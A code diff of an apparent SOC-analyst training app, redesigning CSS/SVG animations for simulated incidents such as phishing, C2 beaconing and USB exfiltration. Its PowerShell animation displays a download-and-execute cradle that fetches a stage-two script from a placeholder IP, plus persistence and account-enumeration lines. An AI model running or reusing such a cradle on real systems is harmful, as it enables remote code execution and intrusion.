@@ -667,7 +667,7 @@ const INCIDENTS = {
       instruction:"Your shift just started. BlueTrace SIEM has a new Critical alert. Read it completely. Check: what rules fired, what host, what user, what time. Then decide: True Positive or False Positive?",
       analyst_note:"A Critical with 97/100 risk score + C2 beacon rule + LSASS rule firing together at 08:17 — this is not a false positive. Open the incident. You have 60 minutes SLA.",
       decision:{
-        question:"You have reviewed the alert. What is your next action?",
+        question:"You have read the SIEM alert. Risk score 97/100, two correlated rules fired at 08:17. Is this a real attack or a false positive?",
         options:[
           {text:"Open incident — classify True Positive",correct:true,why:"Correct. A 97/100 score with multiple correlated rules is a confirmed True Positive. Open the incident and investigate."},
           {text:"Close alert — probably a false positive",correct:false,why:"Incorrect. Multiple correlated rules with a 97/100 score is not noise. Closing this lets an active C2 beacon run undetected."},
@@ -3799,352 +3799,534 @@ function IncidentBriefing({inc, onStart}) {
 
 
 // ════════════════════════════════════════════════════════════════
-// INCIDENT ANIMATIONS — Pure CSS/SVG 3D, no libraries
-// Each animation matches the incident type
+// INCIDENT ANIMATIONS — Cinematic, premium, incident-specific
+// Pure CSS/SVG — no libraries needed
 // ════════════════════════════════════════════════════════════════
 
 function IncidentAnimation({incId}) {
-  // Map incident to animation type
   const type = {
-    "INC-2026-0441": "phishing",   // Spear phishing → C2
-    "INC-2026-0502": "powershell", // PowerShell exec
-    "INC-2026-0521": "travel",     // Impossible travel
-    "INC-2026-0544": "portscan",   // Port scan
-    "INC-2026-0561": "usb",        // USB insider
-    "INC-2026-0578": "dns",        // DNS beaconing
-    "INC-2026-0591": "pentest",    // Pentest FP
-    "INC-2026-0612": "bec",        // BEC fraud
-    "INC-2026-0634": "cloud",      // S3 exposure
-    "INC-2026-0651": "bruteforce", // Auth storm
-  }[incId] || "phishing";
+    "INC-2026-0441":"phishing","INC-2026-0502":"powershell",
+    "INC-2026-0521":"travel","INC-2026-0544":"portscan",
+    "INC-2026-0561":"usb","INC-2026-0578":"dns",
+    "INC-2026-0591":"pentest","INC-2026-0612":"bec",
+    "INC-2026-0634":"cloud","INC-2026-0651":"bruteforce",
+  }[incId]||"phishing";
 
-  const animations = `
-    @keyframes float{0%,100%{transform:translateY(0) rotateX(0deg)}50%{transform:translateY(-8px) rotateX(4deg)}}
-    @keyframes float2{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
-    @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-3px)}40%,80%{transform:translateX(3px)}}
-    @keyframes glow{0%,100%{filter:drop-shadow(0 0 6px rgba(220,38,38,0.6))}50%{filter:drop-shadow(0 0 16px rgba(220,38,38,1))}}
-    @keyframes beam{0%{opacity:0;transform:scaleY(0)}30%{opacity:1;transform:scaleY(1)}70%{opacity:1}100%{opacity:0}}
-    @keyframes ping{0%{transform:scale(1);opacity:1}100%{transform:scale(2.5);opacity:0}}
-    @keyframes fly{0%{transform:translateX(-60px) translateY(20px) rotate(-10deg);opacity:0}60%{opacity:1}100%{transform:translateX(20px) translateY(-10px) rotate(5deg);opacity:0.8}}
-    @keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(400%)}}
-    @keyframes blink2{0%,100%{opacity:1}50%{opacity:0.2}}
-    @keyframes orbit{0%{transform:rotate(0deg) translateX(50px) rotate(0deg)}100%{transform:rotate(360deg) translateX(50px) rotate(-360deg)}}
-    @keyframes zap{0%,100%{opacity:0}10%,90%{opacity:1}50%{opacity:0.3}}
-    @keyframes stream{0%{transform:translateY(-20px);opacity:0}50%{opacity:1}100%{transform:translateY(80px);opacity:0}}
-    @keyframes usb_insert{0%{transform:translateX(-40px);opacity:0}50%{transform:translateX(0px);opacity:1}100%{transform:translateX(0px);opacity:1}}
-    @keyframes data_leak{0%{transform:translateY(0);opacity:1}100%{transform:translateY(30px);opacity:0}}
-    @keyframes globe_spin{0%{transform:rotateY(0deg)}100%{transform:rotateY(360deg)}}
+  const css = `
+    @keyframes ia_float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+    @keyframes ia_float2{0%,100%{transform:translateY(0) rotate(-2deg)}50%{transform:translateY(-7px) rotate(2deg)}}
+    @keyframes ia_pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.95)}}
+    @keyframes ia_ping{0%{transform:scale(1);opacity:0.8}100%{transform:scale(3);opacity:0}}
+    @keyframes ia_ping2{0%{transform:scale(1);opacity:0.6}100%{transform:scale(2.5);opacity:0}}
+    @keyframes ia_glow{0%,100%{filter:drop-shadow(0 0 6px rgba(220,38,38,0.5)) drop-shadow(0 0 20px rgba(220,38,38,0.2))}50%{filter:drop-shadow(0 0 12px rgba(220,38,38,0.9)) drop-shadow(0 0 40px rgba(220,38,38,0.4))}}
+    @keyframes ia_glowblue{0%,100%{filter:drop-shadow(0 0 6px rgba(59,130,246,0.5))}50%{filter:drop-shadow(0 0 16px rgba(59,130,246,1))}}
+    @keyframes ia_beam{0%{opacity:0;height:0}40%{opacity:1;height:100%}70%{opacity:0.8}100%{opacity:0;height:100%}}
+    @keyframes ia_scan{0%{transform:translateY(-5px);opacity:0}20%{opacity:1}80%{opacity:0.8}100%{transform:translateY(90px);opacity:0}}
+    @keyframes ia_fly{0%{transform:translate(-80px,30px) rotate(-15deg) scale(0.5);opacity:0}50%{opacity:1;transform:translate(0,0) rotate(3deg) scale(1)}85%{opacity:1}100%{transform:translate(10px,-8px) rotate(5deg) scale(0.95);opacity:0.9}}
+    @keyframes ia_type{0%{width:0}100%{width:100%}}
+    @keyframes ia_blink{0%,100%{opacity:1}50%{opacity:0}}
+    @keyframes ia_stream{0%{transform:translateY(-30px);opacity:0}40%{opacity:1}100%{transform:translateY(100px);opacity:0}}
+    @keyframes ia_spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    @keyframes ia_spinrev{0%{transform:rotate(0deg)}100%{transform:rotate(-360deg)}}
+    @keyframes ia_orbit{0%{transform:rotate(0deg) translateX(44px) rotate(0deg)}100%{transform:rotate(360deg) translateX(44px) rotate(-360deg)}}
+    @keyframes ia_shake{0%,100%{transform:translateX(0)}15%,45%,75%{transform:translateX(-4px)}30%,60%,90%{transform:translateX(4px)}}
+    @keyframes ia_insert{0%{transform:translateX(-60px);opacity:0}60%{transform:translateX(4px);opacity:1}80%,100%{transform:translateX(0);opacity:1}}
+    @keyframes ia_dataleakline{0%{transform:translateY(0);opacity:0.9}100%{transform:translateY(50px);opacity:0}}
+    @keyframes ia_particle{0%{transform:translate(0,0);opacity:1}100%{transform:translate(var(--px),var(--py));opacity:0}}
+    @keyframes ia_reveal{0%{opacity:0;transform:translateY(6px)}100%{opacity:1;transform:translateY(0)}}
+    @keyframes ia_radar{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    @keyframes ia_zap{0%,100%{opacity:0.2}30%,70%{opacity:1}}
   `;
 
-  // PHISHING ANIMATION — Email flies in, opens, skull appears
-  if (type === "phishing") return (
-    <div style={{position:"relative",width:"100%",height:160,overflow:"hidden"}}>
-      <style>{animations}</style>
-      {/* Dark background */}
-      <div style={{position:"absolute",inset:0,background:"radial-gradient(ellipse at 50% 80%,rgba(220,38,38,0.12) 0%,transparent 70%)"}}/>
+  /* ── PHISHING → C2 ─────────────────────────────────────── */
+  if(type==="phishing") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#080c14 0%,#0d1220 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
+      {/* Deep space background glow */}
+      <div style={{position:"absolute",width:200,height:200,borderRadius:"50%",
+        background:"radial-gradient(circle,rgba(220,38,38,0.08) 0%,transparent 70%)",
+        top:"50%",left:"50%",transform:"translate(-50%,-50%)",pointerEvents:"none"}}/>
 
-      {/* Laptop base */}
-      <div style={{position:"absolute",bottom:10,left:"50%",transform:"translateX(-50%)",
-        width:140,height:8,background:"#1e2533",borderRadius:"0 0 8px 8px",
-        boxShadow:"0 4px 20px rgba(0,0,0,0.5)"}}/>
-
-      {/* Laptop screen */}
-      <div style={{position:"absolute",bottom:18,left:"50%",transform:"translateX(-50%)",
-        width:120,height:75,background:"#0f1117",border:"2px solid #1e2533",
-        borderRadius:"4px 4px 0 0",overflow:"hidden"}}>
-        {/* Screen glow */}
-        <div style={{position:"absolute",inset:0,background:"rgba(220,38,38,0.04)"}}/>
-        {/* Fake desktop icons */}
-        <div style={{position:"absolute",top:6,left:6,display:"flex",gap:3}}>
-          {["#dc2626","#f59e0b","#22c55e"].map((c,i)=>(
-            <div key={i} style={{width:6,height:6,borderRadius:"50%",background:c,opacity:0.7}}/>
-          ))}
-        </div>
-        {/* Email notification pop */}
-        <div style={{position:"absolute",top:16,left:"50%",transform:"translateX(-50%)",
-          animation:"float 3s ease-in-out infinite",
-          background:"#111318",border:"1px solid rgba(220,38,38,0.5)",
-          borderRadius:4,padding:"4px 7px",width:90}}>
-          <div style={{fontSize:7,color:"#f87171",fontFamily:"monospace",fontWeight:700,marginBottom:2}}>
-            📧 NEW MESSAGE
+      {/* Laptop — 3D perspective */}
+      <div style={{position:"absolute",bottom:8,left:"50%",transform:"translateX(-50%) perspective(400px) rotateX(8deg)",
+        width:150,transformOrigin:"bottom center"}}>
+        {/* Screen */}
+        <div style={{background:"#0a0d14",border:"2.5px solid #1e2533",borderRadius:"6px 6px 0 0",
+          height:80,position:"relative",overflow:"hidden",
+          boxShadow:"0 -4px 30px rgba(220,38,38,0.15),inset 0 0 20px rgba(0,0,0,0.5)"}}>
+          {/* Screen content */}
+          <div style={{position:"absolute",inset:0,padding:8}}>
+            <div style={{display:"flex",gap:3,marginBottom:5}}>
+              {["#dc2626","#f59e0b","#22c55e"].map((c,i)=>(
+                <div key={i} style={{width:7,height:7,borderRadius:"50%",background:c}}/>
+              ))}
+            </div>
+            {/* Fake SIEM alert */}
+            <div style={{background:"rgba(220,38,38,0.15)",border:"1px solid rgba(220,38,38,0.4)",
+              borderRadius:3,padding:"3px 5px",marginBottom:4}}>
+              <div style={{fontSize:6.5,color:"#f87171",fontFamily:"monospace",fontWeight:700}}>
+                ⚠ CRITICAL — C2_BEACON_DETECTED
+              </div>
+              <div style={{fontSize:5.5,color:"#6b7280",fontFamily:"monospace",marginTop:1}}>
+                WS-CORP-FIN-044 → 203.0.113.47:443
+              </div>
+            </div>
+            <div style={{fontSize:6,color:"#ef4444",fontFamily:"monospace",
+              animation:"ia_blink 1.2s step-end infinite",fontWeight:700}}>
+              ▶ MACRO PAYLOAD EXECUTING...
+            </div>
           </div>
-          <div style={{fontSize:6,color:"#6b7280",fontFamily:"monospace"}}>invoice_final.docm</div>
-          <div style={{fontSize:6,color:"#ef4444",fontFamily:"monospace",marginTop:2,
-            animation:"blink2 1s infinite"}}>⚠ MACRO ENABLED</div>
+          {/* Scanline */}
+          <div style={{position:"absolute",left:0,right:0,height:2,
+            background:"linear-gradient(90deg,transparent,rgba(220,38,38,0.3),transparent)",
+            animation:"ia_scan 3s linear infinite"}}/>
+        </div>
+        {/* Base */}
+        <div style={{background:"#1e2533",height:6,borderRadius:"0 0 4px 4px",
+          boxShadow:"0 4px 16px rgba(0,0,0,0.6)"}}/>
+        <div style={{background:"#111318",height:3,borderRadius:2,margin:"0 10px",
+          boxShadow:"0 2px 8px rgba(0,0,0,0.4)"}}/>
+      </div>
+
+      {/* Flying evil email */}
+      <div style={{position:"absolute",top:18,right:"18%",
+        animation:"ia_fly 4s ease-in-out infinite"}}>
+        <svg width="44" height="34" viewBox="0 0 44 34"
+          style={{filter:"drop-shadow(0 0 10px rgba(220,38,38,0.7))"}}>
+          <defs>
+            <linearGradient id="emailgrad" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stopColor="#2d0a0a"/>
+              <stop offset="100%" stopColor="#1a0505"/>
+            </linearGradient>
+          </defs>
+          <rect x="1" y="1" width="42" height="32" rx="4" fill="url(#emailgrad)"
+            stroke="#dc2626" strokeWidth="1.5"/>
+          <polyline points="1,1 22,18 43,1" fill="none" stroke="#ef4444" strokeWidth="1.5"/>
+          <text x="22" y="29" textAnchor="middle" fill="#ef4444" fontSize="12"
+            fontFamily="monospace">☠</text>
+        </svg>
+        {/* Ping rings */}
+        {[0,1].map(i=>(
+          <div key={i} style={{position:"absolute",width:20,height:20,borderRadius:"50%",
+            border:"1.5px solid rgba(220,38,38,0.5)",top:7,left:12,
+            animation:`ia_ping ${1.5+i*0.4}s ${i*0.5}s ease-out infinite`}}/>
+        ))}
+      </div>
+
+      {/* C2 beacon beam */}
+      <div style={{position:"absolute",bottom:70,left:"calc(50% + 30px)",
+        width:1.5,background:"linear-gradient(to top,transparent,rgba(220,38,38,0.8),rgba(220,38,38,0.3))",
+        animation:"ia_beam 3s 0.5s ease-in-out infinite",height:50,
+        boxShadow:"0 0 8px rgba(220,38,38,0.4)",transformOrigin:"bottom"}}/>
+
+      {/* Russia server */}
+      <div style={{position:"absolute",top:14,right:"8%",textAlign:"center",
+        animation:"ia_float 3s ease-in-out infinite"}}>
+        <div style={{fontSize:26,animation:"ia_glow 2s ease-in-out infinite"}}>🖥</div>
+        <div style={{fontSize:9,fontWeight:800,color:"#ef4444",fontFamily:"monospace",
+          letterSpacing:"0.1em",animation:"ia_blink 1s 0.3s infinite"}}>RU</div>
+        {[0,1,2].map(i=>(
+          <div key={i} style={{position:"absolute",width:36,height:36,borderRadius:"50%",
+            border:"1px solid rgba(220,38,38,0.3)",top:-5,left:-5,
+            animation:`ia_ping ${2}s ${i*0.6}s ease-out infinite`}}/>
+        ))}
+      </div>
+
+      {/* Particle data stream */}
+      {[...Array(6)].map((_,i)=>(
+        <div key={i} style={{position:"absolute",
+          left:`${45+i*3}%`,bottom:`${50+i*4}%`,
+          width:2,height:2,borderRadius:"50%",background:"#dc2626",
+          animation:`ia_dataleakline 1.5s ${i*0.25}s linear infinite`,
+          opacity:0.7}}/>
+      ))}
+
+      {/* Label */}
+      <div style={{position:"absolute",bottom:4,left:"50%",transform:"translateX(-50%)",
+        fontSize:8,color:"rgba(220,38,38,0.7)",fontFamily:"monospace",
+        letterSpacing:"0.15em",fontWeight:700,whiteSpace:"nowrap"}}>
+        ACTIVE C2 BEACON · SIMULATED
+      </div>
+    </div>
+  );
+
+  /* ── POWERSHELL ─────────────────────────────────────────── */
+  if(type==="powershell") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#080c14 0%,#0d1018 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
+      <div style={{position:"absolute",width:240,height:180,borderRadius:"50%",
+        background:"radial-gradient(circle,rgba(139,92,246,0.07) 0%,transparent 70%)",
+        top:"50%",left:"50%",transform:"translate(-50%,-50%)"}}/>
+
+      {/* Terminal window — 3D */}
+      <div style={{position:"absolute",top:16,left:"50%",transform:"translateX(-50%) perspective(600px) rotateX(3deg)",
+        width:270,animation:"ia_float2 5s ease-in-out infinite"}}>
+        <div style={{background:"#0d0f1a",border:"1.5px solid #3730a3",borderRadius:8,
+          overflow:"hidden",boxShadow:"0 8px 40px rgba(139,92,246,0.25),0 0 0 1px rgba(139,92,246,0.1)"}}>
+          {/* Title bar */}
+          <div style={{background:"#1e1b4b",padding:"5px 8px",display:"flex",
+            alignItems:"center",gap:5,borderBottom:"1px solid #312e81"}}>
+            {["#dc2626","#f59e0b","#22c55e"].map((c,i)=>(
+              <div key={i} style={{width:8,height:8,borderRadius:"50%",background:c}}/>
+            ))}
+            <span style={{fontSize:8,color:"#818cf8",fontFamily:"monospace",marginLeft:4,
+              fontWeight:700}}>Windows PowerShell — ELEVATED</span>
+          </div>
+          {/* Terminal body */}
+          <div style={{padding:"8px 10px",minHeight:100}}>
+            {[
+              {t:0,   color:"#4ade80", text:"PS C:\Users\admin> whoami"},
+              {t:0,   color:"#e8ecf4", text:"CORP\\svc_account (Domain Admin)"},
+              {t:0.4, color:"#4ade80", text:"PS C:\> Invoke-Expression (New-Object Net.WebClient).DownloadString("},
+              {t:0.4, color:"#fbbf24", text:'  "http://203.0.113.47/stage2.ps1")'},
+              {t:0.8, color:"#f87171", text:"[!] Downloading payload..."},
+              {t:1.2, color:"#f87171", text:"[!] Establishing persistence: HKCU\\Run"},
+              {t:1.6, color:"#4ade80", text:"PS C:\> net user /domain"},
+              {t:1.6, color:"#e8ecf4", text:"Enumerating 847 domain accounts..."},
+            ].map((line,i)=>(
+              <div key={i} style={{fontSize:8,color:line.color,fontFamily:"monospace",
+                lineHeight:1.7,overflow:"hidden",
+                animation:`ia_reveal 0.3s ${line.t}s both`}}>
+                {line.text}
+              </div>
+            ))}
+            <span style={{display:"inline-block",width:7,height:13,
+              background:"#4ade80",verticalAlign:"middle",
+              animation:"ia_blink 0.8s step-end infinite"}}/>
+          </div>
+        </div>
+        {/* Scanline overlay */}
+        <div style={{position:"absolute",inset:0,borderRadius:8,overflow:"hidden",
+          pointerEvents:"none"}}>
+          <div style={{position:"absolute",width:"100%",height:3,
+            background:"linear-gradient(90deg,transparent,rgba(139,92,246,0.15),transparent)",
+            animation:"ia_scan 2.5s linear infinite"}}/>
         </div>
       </div>
 
-      {/* Flying email envelope */}
-      <div style={{position:"absolute",top:20,right:"15%",
-        animation:"fly 4s ease-in-out infinite"}}>
-        <svg width="36" height="28" viewBox="0 0 36 28" style={{filter:"drop-shadow(0 0 8px rgba(220,38,38,0.7))"}}>
-          <rect x="1" y="1" width="34" height="26" rx="3" fill="#1e2533" stroke="#dc2626" strokeWidth="1.5"/>
-          <polyline points="1,1 18,16 35,1" fill="none" stroke="#dc2626" strokeWidth="1.5"/>
-          <text x="18" y="23" textAnchor="middle" fill="#ef4444" fontSize="10" fontFamily="monospace">☠</text>
-        </svg>
+      {/* Alert badges */}
+      <div style={{position:"absolute",bottom:8,left:"50%",transform:"translateX(-50%)",
+        display:"flex",gap:6}}>
+        {["LSASS DUMP","PERSISTENCE","LATERAL MOVE"].map(label=>(
+          <div key={label} style={{background:"rgba(220,38,38,0.15)",border:"1px solid rgba(220,38,38,0.4)",
+            borderRadius:4,padding:"2px 6px",fontSize:6.5,color:"#f87171",
+            fontFamily:"monospace",fontWeight:700,animation:"ia_pulse 2s ease-in-out infinite"}}>
+            {label}
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+
+  /* ── IMPOSSIBLE TRAVEL ──────────────────────────────────── */
+  if(type==="travel") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#060a14 0%,#0a1020 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
+
+      {/* Globe */}
+      <div style={{position:"absolute",top:15,left:"50%",transform:"translateX(-50%)",
+        width:110,height:110,borderRadius:"50%",animation:"ia_float2 5s ease-in-out infinite",
+        boxShadow:"0 0 40px rgba(59,130,246,0.2),0 0 0 1px rgba(59,130,246,0.15)"}}>
+        <div style={{width:"100%",height:"100%",borderRadius:"50%",overflow:"hidden",
+          background:"radial-gradient(circle at 35% 30%,#0c2461,#050d1f)"}}>
+          {/* Latitude lines */}
+          {[20,40,60,80].map(y=>(
+            <div key={y} style={{position:"absolute",top:`${y}%`,left:0,right:0,
+              height:1,background:"rgba(59,130,246,0.15)"}}/>
+          ))}
+          {/* Longitude lines */}
+          {[20,35,50,65,80].map(x=>(
+            <div key={x} style={{position:"absolute",left:`${x}%`,top:0,bottom:0,
+              width:1,background:"rgba(59,130,246,0.12)"}}/>
+          ))}
+          {/* Continents */}
+          <div style={{position:"absolute",top:"15%",left:"8%",
+            width:"28%",height:"35%",background:"rgba(34,197,94,0.25)",
+            borderRadius:"40% 55% 45% 35%",filter:"blur(1px)"}}/>
+          <div style={{position:"absolute",top:"20%",left:"42%",
+            width:"22%",height:"30%",background:"rgba(34,197,94,0.22)",
+            borderRadius:"35% 50% 40% 60%",filter:"blur(1px)"}}/>
+          <div style={{position:"absolute",top:"40%",left:"60%",
+            width:"25%",height:"28%",background:"rgba(34,197,94,0.2)",
+            borderRadius:"45% 35% 55% 40%",filter:"blur(1px)"}}/>
+        </div>
+        {/* Globe ring */}
+        <div style={{position:"absolute",inset:-3,borderRadius:"50%",
+          border:"1.5px solid rgba(59,130,246,0.3)",
+          boxShadow:"0 0 20px rgba(59,130,246,0.15)"}}/>
       </div>
 
-      {/* Beacon signal — pulsing circles */}
-      <div style={{position:"absolute",top:30,right:"12%"}}>
+      {/* Pin 1 — Mumbai (green = expected) */}
+      <div style={{position:"absolute",top:20,left:"22%",
+        animation:"ia_float 3s ease-in-out infinite"}}>
+        <div style={{fontSize:20,filter:"drop-shadow(0 0 8px rgba(34,197,94,0.8))"}}>📍</div>
+        <div style={{background:"rgba(34,197,94,0.15)",border:"1px solid rgba(34,197,94,0.5)",
+          borderRadius:4,padding:"2px 5px",marginTop:1}}>
+          <div style={{fontSize:6.5,color:"#4ade80",fontFamily:"monospace",fontWeight:700}}>Mumbai</div>
+          <div style={{fontSize:6,color:"#6b7280",fontFamily:"monospace"}}>09:00 IST</div>
+        </div>
+      </div>
+
+      {/* Pin 2 — London (red = impossible) */}
+      <div style={{position:"absolute",top:15,right:"18%",
+        animation:"ia_float 3s 1.5s ease-in-out infinite"}}>
+        <div style={{fontSize:20,filter:"drop-shadow(0 0 8px rgba(220,38,38,0.8))"}}>📍</div>
+        <div style={{background:"rgba(220,38,38,0.15)",border:"1px solid rgba(220,38,38,0.5)",
+          borderRadius:4,padding:"2px 5px",marginTop:1}}>
+          <div style={{fontSize:6.5,color:"#f87171",fontFamily:"monospace",fontWeight:700}}>London</div>
+          <div style={{fontSize:6,color:"#6b7280",fontFamily:"monospace"}}>09:05 UTC</div>
+        </div>
+      </div>
+
+      {/* Connection arc */}
+      <svg style={{position:"absolute",top:20,left:"27%",width:"46%",height:50}} viewBox="0 0 100 40">
+        <path d="M0 35 Q50 -10 100 30" fill="none" stroke="url(#arcgrad)"
+          strokeWidth="1.5" strokeDasharray="4 2">
+          <animate attributeName="stroke-dashoffset" from="60" to="0"
+            dur="2s" repeatCount="indefinite"/>
+        </path>
+        <defs>
+          <linearGradient id="arcgrad" x1="0" y1="0" x2="1" y2="0">
+            <stop offset="0%" stopColor="#4ade80"/>
+            <stop offset="100%" stopColor="#f87171"/>
+          </linearGradient>
+        </defs>
+      </svg>
+
+      {/* Warning banner */}
+      <div style={{position:"absolute",bottom:8,left:"50%",transform:"translateX(-50%)",
+        background:"rgba(220,38,38,0.15)",border:"1px solid rgba(220,38,38,0.5)",
+        borderRadius:6,padding:"4px 12px",whiteSpace:"nowrap",
+        animation:"ia_pulse 1.5s ease-in-out infinite"}}>
+        <div style={{fontSize:8,color:"#f87171",fontFamily:"monospace",fontWeight:700,
+          letterSpacing:"0.12em",textAlign:"center"}}>
+          ⚠ IMPOSSIBLE · 5 MINUTES · 6,000 KM
+        </div>
+      </div>
+    </div>
+  );
+
+  /* ── USB INSIDER ─────────────────────────────────────────── */
+  if(type==="usb") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#080c14 0%,#0d1018 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
+      <div style={{position:"absolute",top:20,left:"50%",transform:"translateX(-50%)",
+        display:"flex",alignItems:"center",gap:0,animation:"ia_float2 4s ease-in-out infinite"}}>
+        {/* Workstation */}
+        <div style={{background:"#111318",border:"1.5px solid #1e2533",borderRadius:8,
+          padding:"10px 14px",position:"relative",
+          boxShadow:"0 4px 30px rgba(0,0,0,0.5),0 0 0 1px rgba(251,191,36,0.1)"}}>
+          <div style={{fontSize:30,display:"block",textAlign:"center"}}>🖥</div>
+          <div style={{fontSize:7,color:"#6b7280",fontFamily:"monospace",textAlign:"center",
+            marginTop:3}}>WS-CORP-HR-012</div>
+          {/* USB port highlight */}
+          <div style={{position:"absolute",right:-5,top:"50%",transform:"translateY(-50%)",
+            width:5,height:14,background:"#fbbf24",borderRadius:"0 2px 2px 0",
+            opacity:0.8,boxShadow:"0 0 8px rgba(251,191,36,0.6)"}}/>
+        </div>
+
+        {/* USB device animating in */}
+        <div style={{animation:"ia_insert 2.5s ease-out infinite",marginLeft:-2}}>
+          <svg width="55" height="24" viewBox="0 0 55 24"
+            style={{filter:"drop-shadow(0 0 10px rgba(251,191,36,0.6))"}}>
+            <rect x="12" y="4" width="40" height="16" rx="3" fill="#fbbf24"/>
+            <rect x="0" y="6" width="14" height="12" rx="2" fill="#92400e"/>
+            <rect x="17" y="7" width="5" height="10" rx="1" fill="#451a03" opacity="0.4"/>
+            <rect x="25" y="7" width="5" height="10" rx="1" fill="#451a03" opacity="0.4"/>
+            <rect x="33" y="7" width="5" height="10" rx="1" fill="#451a03" opacity="0.4"/>
+            <text x="44" y="18" fill="#451a03" fontSize="9" opacity="0.6">⚡</text>
+          </svg>
+          <div style={{fontSize:7,color:"#fbbf24",fontFamily:"monospace",
+            textAlign:"center",fontWeight:700}}>PERSONAL USB</div>
+        </div>
+      </div>
+
+      {/* Data streaming out */}
+      <div style={{position:"absolute",right:"8%",top:20}}>
+        <div style={{fontSize:9,color:"#f87171",fontFamily:"monospace",
+          fontWeight:700,marginBottom:4}}>EXFIL DATA</div>
+        {["HR_salaries_2026.xlsx","employee_records.csv","strategy_Q3.docx","passwords.txt","vpn_config.ovpn"].map((f,i)=>(
+          <div key={i} style={{fontSize:7.5,color:"#fbbf24",fontFamily:"monospace",
+            display:"flex",alignItems:"center",gap:3,marginBottom:3,
+            animation:`ia_dataleakline 2s ${i*0.4}s ease-in infinite`}}>
+            <span style={{color:"#ef4444"}}>→</span> {f}
+          </div>
+        ))}
+      </div>
+
+      {/* Alert */}
+      <div style={{position:"absolute",bottom:8,left:"50%",transform:"translateX(-50%)",
+        background:"rgba(251,191,36,0.12)",border:"1px solid rgba(251,191,36,0.4)",
+        borderRadius:5,padding:"3px 10px",whiteSpace:"nowrap"}}>
+        <div style={{fontSize:7.5,color:"#fbbf24",fontFamily:"monospace",fontWeight:700,
+          animation:"ia_pulse 1.5s ease-in-out infinite"}}>
+          ⚠ DLP POLICY VIOLATION · DATA STAGING DETECTED
+        </div>
+      </div>
+    </div>
+  );
+
+  /* ── DNS BEACONING ──────────────────────────────────────── */
+  if(type==="dns") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#060e0a 0%,#0a1412 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
+      <div style={{position:"absolute",width:200,height:200,borderRadius:"50%",
+        background:"radial-gradient(circle,rgba(16,185,129,0.06) 0%,transparent 70%)",
+        top:"50%",left:"50%",transform:"translate(-50%,-50%)"}}/>
+
+      {/* Internal host */}
+      <div style={{position:"absolute",left:12,top:"50%",transform:"translateY(-50%)",
+        textAlign:"center",animation:"ia_float 4s ease-in-out infinite"}}>
+        <div style={{background:"#111318",border:"1px solid #1e2533",borderRadius:6,
+          padding:"6px 8px",marginBottom:3}}>
+          <div style={{fontSize:22}}>🖥</div>
+          <div style={{fontSize:6.5,color:"#4b5563",fontFamily:"monospace"}}>CORP-APP-01</div>
+        </div>
+      </div>
+
+      {/* DNS stream */}
+      <div style={{position:"absolute",left:80,right:80,top:0,bottom:0}}>
+        {["a1b2c3.evil-c2.net","d4e5f6.evil-c2.net","g7h8i9.evil-c2.net",
+          "j0k1l2.evil-c2.net","m3n4o5.evil-c2.net","p6q7r8.evil-c2.net"].map((domain,i)=>(
+          <div key={i} style={{position:"absolute",
+            top:`${10+i*14}%`,left:0,right:0,
+            textAlign:"center",
+            animation:`ia_stream 2.5s ${i*0.42}s linear infinite`}}>
+            <div style={{background:"rgba(16,185,129,0.1)",border:"1px solid rgba(16,185,129,0.3)",
+              borderRadius:3,padding:"1.5px 6px",display:"inline-block",
+              fontSize:7,color:"#34d399",fontFamily:"monospace"}}>
+              DNS → {domain}
+            </div>
+          </div>
+        ))}
+        {/* Center arrow */}
+        <div style={{position:"absolute",top:"50%",left:"50%",
+          transform:"translate(-50%,-50%)",
+          fontSize:10,color:"rgba(16,185,129,0.4)",letterSpacing:2}}>
+          ···
+        </div>
+      </div>
+
+      {/* C2 Server */}
+      <div style={{position:"absolute",right:12,top:"50%",transform:"translateY(-50%)",
+        textAlign:"center",animation:"ia_float 4s 2s ease-in-out infinite"}}>
+        <div style={{fontSize:26,animation:"ia_glow 2s ease-in-out infinite"}}>☠️</div>
+        <div style={{fontSize:7,color:"#ef4444",fontFamily:"monospace",fontWeight:700}}>C2 SERVER</div>
         {[0,1,2].map(i=>(
           <div key={i} style={{position:"absolute",width:40,height:40,borderRadius:"50%",
-            border:"1px solid rgba(220,38,38,0.5)",top:-20,left:-20,
-            animation:`ping 2s ${i*0.7}s ease-out infinite`}}/>
+            border:"1px solid rgba(220,38,38,0.3)",top:-7,left:-7,
+            animation:`ia_ping ${1.8}s ${i*0.6}s ease-out infinite`}}/>
         ))}
       </div>
 
-      {/* C2 connection beam */}
-      <div style={{position:"absolute",bottom:40,left:"55%",
-        width:2,height:40,background:"linear-gradient(to top,transparent,#dc2626)",
-        animation:"beam 3s 1s ease-in-out infinite",transformOrigin:"bottom"}}/>
-
-      {/* Russia flag / server icon */}
-      <div style={{position:"absolute",top:15,right:"8%",
-        fontSize:20,animation:"glow 2s ease-in-out infinite"}}>
-        🖥
-      </div>
-      <div style={{position:"absolute",top:35,right:"8%",
-        fontSize:9,color:"#ef4444",fontFamily:"monospace",fontWeight:700,
-        animation:"blink2 1s 0.5s infinite"}}>RU</div>
-    </div>
-  );
-
-  // POWERSHELL ANIMATION — Terminal with scary commands typing
-  if (type === "powershell") return (
-    <div style={{position:"relative",width:"100%",height:160,overflow:"hidden"}}>
-      <style>{animations}</style>
